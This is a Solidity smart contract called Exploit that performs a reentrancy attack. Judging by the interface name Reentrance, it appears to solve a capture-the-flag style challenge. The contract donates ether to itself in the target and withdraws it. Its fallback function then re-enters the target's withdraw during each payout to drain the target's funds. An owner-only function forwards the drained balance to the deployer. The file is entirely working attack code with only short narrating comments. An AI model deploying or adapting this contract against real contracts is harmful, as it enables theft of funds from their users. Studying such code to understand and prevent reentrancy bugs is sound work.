pragma solidity ^0.8.0;

interface Reentrance {
     function withdraw(uint _amount) external;
     function donate(address _to) external payable;
     function balanceOf(address _who)external  view returns (uint balance);
}

contract Exploit {

    address public exploitAddr;

    address public owner;

    constructor( address _exploitAddr ) {
        exploitAddr = _exploitAddr;
        owner = msg.sender;
    }

    function exploit() external payable  {
        // We donate to ourselves to get a balance
        Reentrance(exploitAddr).donate{value: msg.value}(address(this));
        // We immediately withdraw the message value
        Reentrance(exploitAddr).withdraw(msg.value);
    }

    fallback() external payable {
          // We immediately withdraw the message value
          Reentrance(exploitAddr).withdraw(Reentrance(exploitAddr).balanceOf(address(this)));
     }


     function withdraw() external {
        require(owner == msg.sender);

       (bool result,) = payable (msg.sender).call{value: address(this).balance}("");
       require(result);
     }
}